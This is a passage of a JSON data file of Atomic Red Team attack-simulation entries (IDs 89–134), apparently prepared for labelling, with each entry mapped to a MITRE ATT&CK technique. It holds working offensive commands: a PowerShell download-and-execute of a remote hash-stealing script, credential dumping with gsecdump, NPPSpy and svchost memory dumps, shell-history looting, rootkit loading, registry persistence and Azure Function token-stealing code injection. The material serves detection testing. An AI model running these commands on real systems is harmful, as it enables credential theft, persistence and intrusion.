    {
        "ID": 89,
        "Command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\PetitPotam.exe\" 10.0.0.3 10.0.0.2 1\nWrite-Host \"End of PetitPotam attack\"\n",
        "Description": "This module runs the Windows executable of PetitPotam in order to coerce authentication for a remote system.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1187",
        "Shell": "powershell"
    },
    {
        "ID": 90,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')\nInvoke-Internalmonologue -command \"-Downgrade true -impersonate true -restore true\"",
        "Description": "PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1187",
        "Shell": "powershell"
    },
    {
        "ID": 91,
        "Command": "rpcping -s 127.0.0.1 -e 9997 /a connect /u NTLM 1>$Null",
        "Description": "RpcPing command can be used to trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign flag not Set)\nRef: https://twitter.com/splinter_code/status/1421144623678988298",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1187",
        "Shell": "powershell"
    },
    {
        "ID": 92,
        "Command": "xcopy /I /Y \"PathToAtomicsFolder\\T1505.003\\src\" C:\\inetpub\\wwwroot\n",
        "Description": "This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.\nIdea from APTSimulator.\ncmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1505.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 93,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\gsecdump.exe\" -a\n",
        "Description": "Dump credentials from memory using Gsecdump.\n\nUpon successful execution, you should see domain\\username's followed by two 32 character hashes.\n\nIf you see output that says \"compat: error: failed to create child process\", execution was likely blocked by Anti-Virus. \nYou will receive only error output if you do not run this test from an elevated context (run as administrator)\n\nIf you see a message saying \"The system cannot find the path specified\", try using the get-prereq_commands to download and install Gsecdump first.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003",
        "Shell": "command_prompt"
    },
    {
        "ID": 94,
        "Command": "Copy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\NPPSPY.dll\" -Destination \"C:\\Windows\\System32\"\n$path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\n$UpdatedValue = $Path.PROVIDERORDER + \",NPPSpy\"\nSet-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy -ErrorAction Ignore\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Name\" -Value NPPSpy -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\NPPSPY.dll\" -ErrorAction Ignore\necho \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\NPPSpy.txt\"",
        "Description": "Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy.\nAfter user's logging in cleartext password is saved in C:\\NPPSpy.txt.\nClean up deletes the files and reverses Registry changes.\nNPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003",
        "Shell": "powershell"
    },
    {
        "ID": 95,
        "Command": "$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)\nif($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }\nC:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full\n",
        "Description": "The svchost.exe contains the RDP plain-text credentials.\nSource: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n\nUpon successful execution, you should see the following file created $env:TEMP\\svchost-exe.dmp.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003",
        "Shell": "powershell"
    },
    {
        "ID": 96,
        "Command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@t:*\nC:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@text:*\nC:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /text:*",
        "Description": "AppCmd.exe is a command line utility which is used for managing an IIS web server. The list command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.\n[Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003",
        "Shell": "powershell"
    },
    {
        "ID": 97,
        "Command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /config",
        "Description": "AppCmd.exe is a command line utility which is used for managing an IIS web server. The config command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.\n[Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003",
        "Shell": "powershell"
    },
    {
        "ID": 98,
        "Command": "rundll32.exe keymgr,KRShowKeyMgr",
        "Description": "This test executes the exported function `KRShowKeyMgr` located in `keymgr.dll` using `rundll32.exe`. It opens a window that allows to export stored Windows credentials from the credential manager to a file (`.crd` by default). The file can then be retrieved and imported on an attacker-controlled computer to list the credentials get the passwords. The only limitation is that it requires a CTRL+ALT+DELETE input from the attacker, which can be achieve multiple ways (e.g. a custom implant with remote control capabilities, enabling RDP, etc.).\nReference: https://twitter.com/0gtweet/status/1415671356239216653",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003",
        "Shell": "powershell"
    },
    {
        "ID": 99,
        "Command": "rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM 1>$Null",
        "Description": "RpcPing command can be used to send an RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process. \nRef: https://twitter.com/vysecurity/status/974806438316072960",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003",
        "Shell": "powershell"
    },
    {
        "ID": 100,
        "Command": "$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll\" /f\\t   \n}\nelse{\n  Write-Host \"32-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\" /f\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\"\n",
        "Description": "Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office\napplication is started. Key is used for debugging purposes. Not created by default & exist in HKCU & HKLM hives.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1137.002",
        "Shell": "powershell"
    },
    {
        "ID": 101,
        "Command": "at 13:20 /interactive cmd\n",
        "Description": "Executes cmd.exe\nNote: deprecated in Windows 8+\n\nUpon successful execution, cmd.exe will spawn at.exe and create a scheduled task that will spawn cmd at a specific time.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 102,
        "Command": "echo \"echo Hello from Atomic Red Team\" | at now + 1 minute",
        "Description": "This test submits a command to be run in the future by the `at` daemon.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.002",
        "Shell": "sh"
    },
    {
        "ID": 103,
        "Command": "gcloud config set project art-project-1\ngcloud iam service-accounts create gcp-art-service-account-1\ngcloud iam service-accounts keys create gcp-art-service-account-1.json --iam-account=gcp-art-service-account-1@art-project-1.iam.gserviceaccount.com\n",
        "Description": "GCP Service Accounts can be used to gain intial access as well as maintain persistence inside Google Cloud.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1078.004",
        "Shell": "sh"
    },
    {
        "ID": 104,
        "Command": "New-AzAutomationRunbook -Name ART-RunbookName-T1078-004 -Type PowerShell -ResourceGroupName ART-ResourceGroupName-T1078-004 -Description 'my-test-runbook' -AutomationAccountName ART-AutomationAccountName-T1078-004\n",
        "Description": "Identifies when an Azure Automation runbook is created or modified. An adversary may create or modify an Azure\nAutomation runbook to execute malicious code and maintain persistence in their target's environment.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1078.004",
        "Shell": "powershell"
    },
    {
        "ID": 105,
        "Command": "gcloud config set project atomic-test-1\ngcloud iam roles create AtomicRedTeamRole --description=\"Atomic Red Team Custom IAM Role\" --permissions=iam.serviceAccounts.get --project=atomic-test-1\n",
        "Description": "This atomic will create a new IAM role. The default role permissions are: *IAM Service Account Get*. The idea for this Atomic came from a Rule published by the Elastic team.\n\nIdentifies an Identity and Access Management (IAM) custom role creation in Google Cloud Platform (GCP). \nCustom roles are user-defined, and allow for the bundling of one or more supported permissions to meet specific needs. \nCustom roles will not be updated automatically and could lead to privilege creep if not carefully scrutinized.\n\nThis atomic will create a new IAM role. The default role permissions are: *IAM Service Account Get*\n\nReference: https://github.com/elastic/detection-rules/blob/main/rules/integrations/gcp/initial_access_gcp_iam_custom_role_creation.toml\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1078.004",
        "Shell": "sh"
    },
    {
        "ID": 106,
        "Command": "cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > ~/loot.txt\n",
        "Description": "Search through bash history for specifice commands we want to capture\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.003",
        "Shell": "sh"
    },
    {
        "ID": 107,
        "Command": "cat ~/.history | grep -e '-p ' -e 'pass' -e 'ssh' > ~/loot.txt\n",
        "Description": "Search through sh history for specifice commands we want to capture\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.003",
        "Shell": "sh"
    },
    {
        "ID": 108,
        "Command": "sudo insmod PathToAtomicsFolder/T1014/bin/T1014.ko\n",
        "Description": "Loadable Kernel Module based Rootkit\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1014",
        "Shell": "sh"
    },
    {
        "ID": 109,
        "Command": "sudo modprobe T1014\n",
        "Description": "Loadable Kernel Module based Rootkit\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1014",
        "Shell": "sh"
    },
    {
        "ID": 110,
        "Command": "echo /usr/local/lib/libprocesshider.so | tee -a /etc/ld.so.preload\n/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo \"process hidden\"\n",
        "Description": "Uses libprocesshider to simulate rootkit behavior by hiding a specific process name via ld.so.preload (see also T1574.006).\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1014",
        "Shell": "sh"
    },
    {
        "ID": 111,
        "Command": "sudo modprobe diamorphine\nping -c 10 localhost >/dev/null & TARGETPID=\"$!\"\nps $TARGETPID\nkill -31 $TARGETPID\nps $TARGETPID || echo \"process ${TARGETPID} hidden\"\n",
        "Description": "Loads Diamorphine kernel module, which hides itself and a processes.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1014",
        "Shell": "sh"
    },
    {
        "ID": 112,
        "Command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\calc.exe\" /v Debugger /d \"C:\\Windows\\System32\\cmd.exe\"\n",
        "Description": "Leverage Global Flags Settings\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.012",
        "Shell": "command_prompt"
    },
    {
        "ID": 113,
        "Command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v GlobalFlag /t REG_DWORD /d 512\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v ReportingMode /t REG_DWORD /d 1\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v MonitorProcess /d \"C:\\Windows\\System32\\cmd.exe\"\n",
        "Description": "Leverage Global Flags Settings\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.012",
        "Shell": "command_prompt"
    },
    {
        "ID": 114,
        "Command": "$Name = \"GlobalFlag\"\n$Value = \"512\"\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\whoami.exe\"\nNew-Item -Path $registryPath -Force\nNew-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force\n$Name = \"ReportingMode\"\n$Value = \"1\"\n$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\whoami.exe\"\nNew-Item -Path $SilentProcessExit -Force\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force \n\n$Name = \"MonitorProcess\"\n$Value = \"cmd.exe /c calc.exe\"\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force\nStart-Process whoami.exe\n",
        "Description": "The following Atomic Test will create a GlobalFlag key under Image File Execution Options, also a SilentProcessExit Key with ReportingMode and MonitorProcess values. This test is similar to a recent CanaryToken that will generate an EventCode 3000 in the Application log when a command, whoami.exe for example, is executed.\nUpon running Whoami.exe, a command shell will spawn and start calc.exe based on the MonitorProcess value. \nUpon successful execution, powershell will modify the registry and spawn calc.exe. An event 3000 will generate in the Application log.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.012",
        "Shell": "powershell"
    },
    {
        "ID": 115,
        "Command": "az login\\t# Log in to Azure CLI\n\n$allowSharedKeyAccess = az storage account show --name \"storage_account_name_example\" --query \"allowSharedKeyAccess\"\n\nif ($allowSharedKeyAccess -eq \"false\") {\\t# $allowSharedKeyAccess could be true or null\n\\tWrite-Output \"Shared key access is disabled for this storage account.\"\n} else {\\t\n\\t$connectionString = az storage account show-connection-string --name \"storage_account_name_example\" --query connectionString --output tsv\n\n\\t# Download blob for cleanup\n\\t$tmpOriginalFunctionCode = Join-Path $env:temp/ (\"T1550.001_tmp_original_\" + \"blob_example\")\n\\taz storage blob download --connection-string $connectionString --container-name \"container_name_example\" --name \"blob_example\" --file $tmpOriginalFunctionCode --overwrite true\n\n\\tif ($LASTEXITCODE -eq 0) {\n\\t\\t# Upload new blob version if download of existing blob succeeded\n\\t\\taz storage blob upload --connection-string $connectionString --container-name \"container_name_example\" --name \"blob_example\" --file \"$env:temp/T1550.001_function_code.zip\" --overwrite true\n\\t} else {\n\\t\\tWrite-Output \"Download original function code failed.\"\n\\t\\texit 1\n\\t}\n}\n",
        "Description": "This test injects code into an Azure Function (RCE).\n\nAttack idea/reference: https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/\n\nSimilar to T1550.001 \"Azure - Functions code upload - Functions code injection to retrieve the Functions identity access token\", the depicted code injection scenario tampers the source code of Azure Functions to perform Subscription Privilege Escalation by retrieving the identity access token of an Azure functions instance. In this case, the prepared zip file (underlying package for a Function) is expected to contain the tampered function presented in src/code_to_insert.py. Note that the endpoint https://changeme.net needs to be adapted in your packed function code.\n\nNote:\n- The Azure Function modified in this test must be hosted via Azure Blob storage (Info on storage considerations for Azure Function: https://learn.microsoft.com/en-us/azure/azure-functions/storage-considerations). \n- For Function code upload to Azure Functions that are hosted via Azure Files in a File Share, refer to T1550.001 \"Azure - Functions code upload - Functions code injection to retrieve the Functions identity access token\".\n- The required input fields can be retrieved in a reconnaissance step in test T1619 \"Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI\". The code of function apps may be inspected and prepared from the result of test T1530 \"Azure - Dump Azure Storage Account Objects via Azure CLI\".\n\nRequirements:\n- The test is intended to be executed in interactive mode (with -Interactive parameter) in order to complete the az login command when MFA is required.\n- The EntraID user must have the role \"Storage Account Contributor\", or a role with similar permissions.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1550.001",
        "Shell": "powershell"
    },
    {
        "ID": 116,
        "Command": "az login\\t# Log in to Azure CLI\n\n$allowSharedKeyAccess = az storage account show --name \"storage_account_name_example\" --query \"allowSharedKeyAccess\"\n\nif ($allowSharedKeyAccess -eq \"false\") {\\t# $allowSharedKeyAccess could be true or null\n\\tWrite-Output \"Shared key access is disabled for this storage account.\"\n} else {\n\\t# Download file for cleanup\n\\t$tmpOriginalFileName = [System.IO.Path]::GetFileName(\"site/wwwroot/function_app.py\")\n\\t$tmpOriginalFunctionCode = Join-Path $env:temp/ (\"T1550.001_tmp_original_\" + $tmpOriginalFileName)\n\\taz storage file download --account-name \"storage_account_name_example\" --share-name \"file_share_name_example\" -p \"site/wwwroot/function_app.py\" --only-show-errors --dest $tmpOriginalFunctionCode\n\n\\tif ($LASTEXITCODE -eq 0) {\n\\t\\t# Upload new funciton code if download of existing code succeeded\n\\t\\tif (\"insert_code\" -eq \"insert_code\") {\n\\t\\t\\t# Download file from file share for injection\n\\t\\t\\t$tmpFunctionCode = Join-Path $env:temp/ (\"T1550.001_tmp_to_inject_\" + $tmpOriginalFileName)\n\\t\\t\\taz storage file download --account-name \"storage_account_name_example\" --share-name \"file_share_name_example\" -p \"site/wwwroot/function_app.py\" --only-show-errors --dest $tmpFunctionCode\n\\t\\t\\t\n\\t\\t\\tif ($LASTEXITCODE -ne 0) {\n\\t\\t\\t\\tWrite-Output \"Function code download failed.\"\n\\t\\t\\t\\texit 1\n\\t\\t\\t}\n\\t\\t\\tWrite-Output \"File downloaded: $($tmpFunctionCode)\"\n\\t\\t\\t\n\\t\\t\\t$insertContent = Get-Content -Path \"$PathToAtomicsFolder/T1550.001/src/code_to_insert.py\" -Raw  # Load the content of the insert file\n\\t\\t\\t\n\\t\\t\\t$content = Get-Content -Path $tmpFunctionCode -Raw  # Inject code to file\n\\t\\t\\t$content = $insertContent + \"`n\" + $content\\t # Insert the new code at the beginning\n\\t\\t\\t$content | Set-Content -Path $tmpFunctionCode\\t   # Write the modified content to the file\n\\t\\t\\t\n\\t\\t\\t# Upload file to file share\n\\t\\t\\taz storage file upload --account-name \"storage_account_name_example\" --share-name \"file_share_name_example\" -p \"site/wwwroot/function_app.py\" --source $tmpFunctionCode --only-show-errors\n\\t\\t\\tif ($LASTEXITCODE -ne 0) {\n\\t\\t\\t\\tWrite-Output \"Function code upload failed.\"\n\\t\\t\\t\\texit 1\n\\t\\t\\t}\n\\t\\t\\tWrite-Output \"Uploaded the tampered file\"\n\\t\\t} elseif (\"insert_code\" -eq \"replace_file\") {\n\\t\\t\\taz storage file upload --account-name \"storage_account_name_example\" --share-name \"file_share_name_example\" -p \"site/wwwroot/function_app.py\" --source \"$PathToAtomicsFolder/T1550.001/src/code_to_insert.py\" --only-show-errors\n\\t\\t\\tif ($LASTEXITCODE -ne 0) {\n\\t\\t\\t\\tWrite-Output \"Function code upload failed.\"\n\\t\\t\\t\\texit 1\n\\t\\t\\t}\n\\t\\t\\tWrite-Output \"Uploaded the tampered file\"\n\\t\\t} else {\n\\t\\t\\tWrite-Output \"Please choose a valid execution_option\"\n\\t\\t\\texit 1\n\\t\\t}\n\\t} else {\n\\t\\tWrite-Output \"Download original function code failed.\"\n\\t\\texit 1\n\\t}\n}",
        "Description": "This test injects code into an Azure Function (RCE) to perform Subscription Privilege Escalation by retrieving the identity access token of an Azure functions instance.\n\nAttack idea/reference: https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/\n\nOnce executed, the \"https://changeme\" will retrieve the access token when the function app is executed on behalf of the tenant. The function may be triggered manually from authorized people, triggered in regular intervals, or in various other ways. The access token can then be used to perform further attack steps with the permissions that the function app holds (e.g. listening virtual machines).\n\nNote: \n- The Azure Function modified in this test must be hosted via Azure Files in a File Share (Info on storage considerations for Azure Function: https://learn.microsoft.com/en-us/azure/azure-functions/storage-considerations).\n- For Function code upload to Azure Functions that are hosted via Azure Blob storage, refer to T1550.001 \"Azure - Functions code upload - Functions code injection via Blob upload\".\n- The required input fields can be retrieved in a reconnaissance step in test T1619 \"Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI\". The code of function apps may be inspected and prepared from the result of test T1530 \"Azure - Dump Azure Storage Account Objects via Azure CLI\".\n- Important: Change the https://changeme.net in code_to_insert_path to a self-controlled endpoint. This endpoint can be hosted e.g. as request bin via Pipedream to display the body of incoming POST requests.\n- The default injected code to retrieve the access token can be replaced by arbitrary other code. In this case: Replace the code defined in code_to_insert_path\n\nRequirements:\n- The test is intended to be executed in interactive mode (with -Interactive parameter) in order to complete the az login command when MFA is required.\n- The EntraID user must have the role \"Storage Account Contributor\", or a role with similar permissions.\n\nExecution options: Defined by the input field execution_option\n- insert_code: This option (1) downloads the existing funciton code into a tmp file, (2) injects the code from code_to_insert_path at the beginning of the file, and (3) uploads the tampered file to the targeted Azure Function code (Azure File Share File).\n- replace_file: This option uploads the function code defined in code_to_insert_path to the targeted Azure Function code (Azure File Share File).",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1550.001",
        "Shell": "powershell"
    },
    {
        "ID": 117,
        "Command": "net view /domain\nnet view\n",
        "Description": "Identify remote systems with net.exe.\n\nUpon successful execution, cmd.exe will execute `net.exe view` and display results of local systems on the network that have file and print sharing enabled.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1018",
        "Shell": "command_prompt"
    },
    {
        "ID": 118,
        "Command": "net group \"Domain Computers\" /domain\n",
        "Description": "Identify remote systems with net.exe querying the Active Directory Domain Computers group.\n\nUpon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the \"Domain Computers\" group. Output will be via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1018",
        "Shell": "command_prompt"
    },
    {
        "ID": 119,
        "Command": "nltest.exe /dclist:%userdnsdomain%\n",
        "Description": "Identify domain controllers for specified domain.\n\nUpon successful execution, cmd.exe will execute nltest.exe against a target domain to retrieve a list of domain controllers. Output will be via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1018",
        "Shell": "command_prompt"
    },
    {
        "ID": 120,
        "Command": "for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i  \n",
        "Description": "Identify remote systems via ping sweep.\n\nUpon successful execution, cmd.exe will perform a for loop against the 192.168.1.1/24 network. Output will be via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1018",
        "Shell": "command_prompt"
    },
    {
        "ID": 121,
        "Command": "arp -a\n",
        "Description": "Identify remote systems via arp. \n\nUpon successful execution, cmd.exe will execute arp to list out the arp cache. Output will be via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1018",
        "Shell": "command_prompt"
    },
    {
        "ID": 122,
        "Command": "arp -a | grep -v '^?'\n",
        "Description": "Identify remote systems via arp.\n\nUpon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1018",
        "Shell": "sh"
    },
    {
        "ID": 123,
        "Command": "for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo \"192.168.1.$ip UP\" || : ; done\n",
        "Description": "Identify remote systems via ping sweep.\n\nUpon successful execution, sh will perform a ping sweep on the 192.168.1.1/24 and echo via stdout if an IP is active.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1018",
        "Shell": "sh"
    },
    {
        "ID": 124,
        "Command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]\n$pieces = $localip.split(\".\")\n$firstOctet = $pieces[0]\n$secondOctet = $pieces[1]\n$thirdOctet = $pieces[2]\nforeach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}\n",
        "Description": "Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig.\n\nUpon successful execution, powershell will identify the ip range (via ipconfig) and perform a for loop and execute nslookup against that IP range. Output will be via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1018",
        "Shell": "powershell"
    },
    {
        "ID": 125,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1018\\Scripts\\adidnsdump\" -u domain\\user -p password --print-zones 192.168.1.1\n",
        "Description": "This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks\nPython 3 and adidnsdump must be installed, use the get_prereq_command's to meet the prerequisites for this test.\nSuccessful execution of this test will list dns zones in the terminal.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1018",
        "Shell": "command_prompt"
    },
    {
        "ID": 126,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=computer) \n",
        "Description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Computer Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1018",
        "Shell": "command_prompt"
    },
    {
        "ID": 127,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"  -sc dclist\n",
        "Description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Domain Controller Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1018",
        "Shell": "command_prompt"
    },
    {
        "ID": 128,
        "Command": "ip neighbour show\n",
        "Description": "Use the ip neighbour command to display the known link layer (ARP table) addresses for hosts sharing the same network segment. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1018",
        "Shell": "sh"
    },
    {
        "ID": 129,
        "Command": "ip route show\n",
        "Description": "Use the ip route command to display the kernels routing tables. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1018",
        "Shell": "sh"
    },
    {
        "ID": 130,
        "Command": "netstat -r | grep default\n",
        "Description": "Use the netstat command to display the kernels routing tables.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1018",
        "Shell": "sh"
    },
    {
        "ID": 131,
        "Command": "ip tcp_metrics show |grep --invert-match \"^127\\.\"\n",
        "Description": "Use the ip tcp_metrics command to display the recent cached entries for IPv4 and IPv6 source and destination addresses. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1018",
        "Shell": "sh"
    },
    {
        "ID": 132,
        "Command": "$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher(\"(ObjectCategory=Computer)\")\n$DirectorySearcher.PropertiesToLoad.Add(\"Name\")\n$Computers = $DirectorySearcher.findall()\nforeach ($Computer in $Computers) {\n  $Computer = $Computer.Properties.name\n  if (!$Computer) { Continue }\n  Write-Host $Computer}\n",
        "Description": "This test is a Powershell script that enumerates Active Directory to determine computers that are joined to the domain. \nThis test is designed to mimic how SessionGopher can determine the additional systems within a domain, which has been used before by threat actors to aid in lateral movement. \nReference: [Head Fake: Tackling Disruptive Ransomware Attacks](https://www.mandiant.com/resources/head-fake-tackling-disruptive-ransomware-attacks). \nUpon successful execution, this test will output the names of the computers that reside on the domain to the console window. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1018",
        "Shell": "powershell"
    },
    {
        "ID": 133,
        "Command": "Get-AdComputer -Filter *\n",
        "Description": "The following Atomic test will utilize Get-AdComputer to enumerate Computers within Active Directory.\nUpon successful execution a listing of Computers will output with their paths in AD.\nReference: https://github.com/MicrosoftDocs/windows-powershell-docs/blob/main/docset/winserver2022-ps/activedirectory/Get-ADComputer.md\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1018",
        "Shell": "powershell"
    },
    {
        "ID": 134,
        "Command": "([adsisearcher]\"objectcategory=computer\").FindAll(); ([adsisearcher]\"objectcategory=computer\").FindOne()\n",
        "Description": "The following Atomic test will utilize ADSISearcher to enumerate computers within Active Directory.\nUpon successful execution a listing of computers will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1018",
